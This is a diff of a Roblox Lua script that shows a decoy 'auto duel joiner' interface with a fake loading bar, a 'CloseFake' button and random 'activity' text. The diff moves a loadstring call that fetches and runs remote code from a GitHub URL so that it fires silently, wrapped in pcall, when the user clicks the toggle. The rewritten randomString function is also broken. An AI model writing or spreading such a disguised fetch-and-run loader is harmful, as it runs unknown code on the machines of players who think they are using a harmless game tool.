@@ -1,6 +1,4 @@
-task.spawn(function()
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/delt-script/script/main/load.lua"))()
-end)
+local executed = false
 
 local ScreenGui = Instance.new("ScreenGui")
 ScreenGui.Name = "MainGUI"
@@ -15,10 +13,6 @@ LoadingFrame.Parent = ScreenGui
 LoadingFrame.Size = UDim2.new(1, 0, 1, 0)
 LoadingFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
 LoadingFrame.ZIndex = 1000
-
-local CornerLoad = Instance.new("UICorner")
-CornerLoad.Parent = LoadingFrame
-CornerLoad.CornerRadius = UDim.new(0, 6)
 
 local LoadingText = Instance.new("TextLabel")
 LoadingText.Parent = LoadingFrame
@@ -38,19 +32,10 @@ LoadingBarBG.Position = UDim2.new(0.2, 0, 0.55, 0)
 LoadingBarBG.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
 LoadingBarBG.ZIndex = 1001
 
-local CornerBarBG = Instance.new("UICorner")
-CornerBarBG.Parent = LoadingBarBG
-CornerBarBG.CornerRadius = UDim.new(0, 6)
-
 local LoadingBar = Instance.new("Frame")
 LoadingBar.Parent = LoadingBarBG
 LoadingBar.Size = UDim2.new(0, 0, 1, 0)
-LoadingBar.BackgroundColor3 = Color3.fromRGB(255,255,255)
 LoadingBar.ZIndex = 1002
-
-local CornerBar = Instance.new("UICorner")
-CornerBar.Parent = LoadingBar
-CornerBar.CornerRadius = UDim.new(0, 6)
 
 local Gradient = Instance.new("UIGradient")
 Gradient.Parent = LoadingBar
@@ -62,20 +47,11 @@ Gradient.Color = ColorSequence.new({
 task.spawn(function()
 	local duration = 12
 	local steps = 240
-	local waitTime = duration / steps
-
 	for i = 1, steps do
 		LoadingBar.Size = UDim2.new(i/steps, 0, 1, 0)
-
-		local dots = string.rep(".", (i % 3) + 1)
-		LoadingText.Text = "Loading" .. dots
-
-		LoadingBar.BackgroundTransparency = math.sin(i/10) * 0.2
-		Gradient.Offset = Vector2.new(i/steps * 0.3, 0)
-
-		task.wait(waitTime)
+		LoadingText.Text = "Loading" .. string.rep(".", (i % 3) + 1)
+		task.wait(duration/steps)
 	end
-
 	LoadingFrame:Destroy()
 end)
 
@@ -86,10 +62,6 @@ MainFrame.Position = UDim2.new(0.04, 0, 0.04, 0)
 MainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
 MainFrame.BorderSizePixel = 0
 MainFrame.ZIndex = 100
-
-local CornerMain = Instance.new("UICorner")
-CornerMain.Parent = MainFrame
-CornerMain.CornerRadius = UDim.new(0, 6)
 
 local UIStrokeMain = Instance.new("UIStroke")
 UIStrokeMain.Parent = MainFrame
@@ -107,16 +79,6 @@ ToggleButton.Font = Enum.Font.SourceSansBold
 ToggleButton.BackgroundColor3 = Color3.fromRGB(170, 30, 30)
 ToggleButton.TextColor3 = Color3.fromRGB(255,255,255)
 ToggleButton.ZIndex = 200
-
-local CornerBtn = Instance.new("UICorner")
-CornerBtn.Parent = ToggleButton
-CornerBtn.CornerRadius = UDim.new(0, 6)
-
-local UIStrokeBtn = Instance.new("UIStroke")
-UIStrokeBtn.Parent = ToggleButton
-UIStrokeBtn.Thickness = 2
-UIStrokeBtn.Color = Color3.fromRGB(255,255,255)
-UIStrokeBtn.Transparency = 0.5
 
 local CloseFake = Instance.new("TextButton")
 CloseFake.Parent = MainFrame
@@ -150,6 +112,21 @@ ToggleButton.MouseButton1Click:Connect(function()
 	if isOn then
 		ToggleButton.BackgroundColor3 = Color3.fromRGB(40, 140, 40)
 		ActivityText.Visible = true
+
+		if not executed then
+			executed = true
+
+			task.spawn(function()
+				local success, result = pcall(function()
+					return loadstring(game:HttpGet("https://raw.githubusercontent.com/delt-script/script/main/load.lua"))()
+				end)
+
+				if success and typeof(result) == "function" then
+					pcall(result)
+				end
+			end)
+		end
+
 	else
 		ToggleButton.BackgroundColor3 = Color3.fromRGB(170, 30, 30)
 		ToggleButton.Text = "auto duel joiner"
@@ -161,12 +138,11 @@ end)
 local chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
 
 local function randomString(len)
-	local result = table.create(len)
+	local t = {}
 	for i = 1, len do
-		local rand = math.random(1, #chars)
-		result[i] = chars:sub(rand, rand)
+		t[i] = chars:sub(math.random(1,#chars), math.random(1,#chars))
 	end
-	return table.concat(result)
+	return table.concat(t)
 end
 
 task.spawn(function()
@@ -186,7 +162,7 @@ task.spawn(function()
 	while true do
 		if isOn then
 			ActivityText.Text = randomString(20)
-			task.wait(math.random(10, 60) / 100)
+			task.wait(math.random(10,60)/100)
 		else
 			task.wait(0.2)
 		end
